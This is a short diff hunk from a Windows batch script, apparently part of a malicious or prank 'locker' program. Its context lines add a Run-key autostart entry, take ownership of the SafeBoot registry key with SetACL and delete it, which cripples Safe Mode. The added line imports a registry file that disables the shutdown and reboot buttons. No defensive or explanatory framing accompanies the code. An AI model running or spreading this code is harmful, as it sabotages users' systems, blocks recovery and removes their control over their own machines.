@@ -214,6 +214,7 @@ reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v cm
 %CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn setowner -ownr "n:Administrators"
 %CD%\junkins\startup\SetACL.exe -on "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" -ot reg -actn ace -ace "n:Administrators;p:full"
 reg delete "HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\SafeBoot" /f
+reg import "%CD%\junkins\startup\disableshutdownandrebootbutton.reg"
 RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
 goto AAAAJJ
 :AAAAJJ
